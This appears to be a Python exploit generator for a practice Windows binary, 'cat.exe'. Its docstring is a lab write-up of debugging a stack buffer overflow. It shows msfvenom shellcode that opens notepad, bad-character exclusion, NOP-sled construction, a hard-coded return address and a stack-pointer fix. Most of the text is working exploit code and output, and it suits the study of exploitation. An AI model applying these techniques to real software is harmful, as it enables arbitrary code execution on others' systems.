"""

## `fuzz5.py`

 * Load shellcode from a file and generate an exploit.
 * Because the stack might change in later versions,
   a nop sled will be prepended and the address will point to the middle nop.
 * The payload must be in hex format. (use payload_run_notepad.msfv for a payload)

### .. Test 1

 * Generate payload, save to payload.dat
```
root@kali:~# msfvenom --payload windows/exec --platform windows --arch x86 -b '\x00' -f hex CMD=\\windows\\notepad.exe 2>/dev/null
ddc6d97424f4bebb27ecb25d29c9b13431751883edfc0375afc5194e278be ...... ecfbab8afa5bc6fcfefe1f8467e7e69ee0d221b7f86bf931e026e3699af6e
```

 * Test
```
> exploit.py payload.dat [exploit.dat]
> ImmunityDebugger.exe cat.exe exploit.dat
```

### .. Result 1

 * A breakpoint on `0x40109C`, after the call to the read function that overwrites the stack,
   reveals that the payload was not completely written to the stack. 
```
00401097  |. E8 04020000    CALL cat.004012A0
0040109C  |. 50             PUSH EAX
```

 * It starts with the nop sled `90909090` but ends 22 bytes further on `FCED`,
   which should be `EDFC` in the payload.
```
0019FD6C   90909090
0019FD70   74D9C6DD
0019FD74   BBBEF424
0019FD78   5DB2EC27
0019FD7C   34B1C929
0019FD80   83187531
0019FD84   0000FCED
0019FD88   00000000
```
   
 * Looking to the payload there is a control char (value < 32) on which the read
   function breaks.
`ddc6d97424f4bebb27ecb25d29c9b13431751883`**`edfc`**___`03`___`75afc5194e278be ...`

### .. Conclusion 1

 * The payload can not contain null chars and control chars.

---
### .. Test 2

 * Generate payload, avoid all control chars.
```
root@kali:~# msfvenom --payload windows/exec --platform windows --arch x86 -b '\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F' -f hex CMD=\\windows\\notepad.exe 2>/dev/null
89e6d9cad976f45f5759494949494949494 ...... 3516244546e50655348453545504141r
```

 * Test
```
> exploit.py payload.dat [exploit.dat]
> ImmunityDebugger.exe cat.exe exploit.dat
```

### .. Result 2

 * A breakpoint on the same position shows that the address `0x19FB6A` is written to the stack.
```
0019FE54   41415045  EPAA
0019FE58   0019FB6A  jû.
0019FE5C   02623F40  @?b
```

 * But when the payload code runs we have another exception.
```
00401000   [19:23:01] Program entry point
0040109C   [19:23:04] Breakpoint at cat.0040109C
004010BB   [19:23:05] Breakpoint at cat.004010BB
0019FD58   [19:23:07] Access violation when writing to [00000097]
```

 * This might be caused by the stack pointer [Esp] pointing to the end of the payload.
   As the payload goes upward, executing the payload makes the stack go downward.
   Thus the payload gets overwritten because the stack pointer should point to `0x19FE58 - 1028`

 * Placing a breakpoint on the ret instruction at `0x4010BB` and pressing F7 allows to go to the 
   nop sled.
```
004010BA  |. C9             LEAVE
004010BB  \. C2 0800        RETN 8
```

 * Where this instruction can be assembled manually. 
 * *`0x408 + 0x8 + 0x4 = 0x414` (payload size + retn size + address size)*
 * But `Sub Esp, 0x00000414` contains zeroes, which is solved by `Add Esp, 0xFFFFFBEC`
 * *`0x100000000 - 0x414 = 0xFFFFFBEC`*
 * Right click the at offset  and click *assemble*, enter `Add Esp, 0xFFFFFBEC`.

```
0019FB69   90               NOP
0019FB6A   81C4 ECFBFFFF    ADD ESP,-414
0019FB70   90               NOP
```
 
 * Hit F9, notepad should pop up.

### ... Conclusion 2

 * The payload shoud have code prepended to adjust the stack pointer before executing.


"""

import argparse
import re
from struct import pack

parser = argparse.ArgumentParser(description='Exploit cat.')
parser.add_argument('payload', type=argparse.FileType('r'), help="The file containing the payload")
parser.add_argument('--exploit', type=argparse.FileType('wb'), default="exploit.dat", help="The output file.")
args = parser.parse_args()

address = 0x19FA54
maximum = 1028

payload = args.payload.read(maximum * 2)
payload = bytearray.fromhex(payload)

nopsize = maximum - len(payload)
middle = int(nopsize / 2)

args.exploit.write("\x90" * nopsize + payload + pack('i', address + middle))

print("Payload name: " + re.search("'(.*)',", str(args.payload)).group(1))
print("Payload size: " + str(len(payload)))
print("Nopsled size: " + str(nopsize))
print("Total size: " + str(nopsize + len(payload)))
print("Mid address: " + hex(address + middle))
print("Exploit created: " + re.search("'(.*)',", str(args.exploit)).group(1))

args.payload.close()
args.exploit.close()
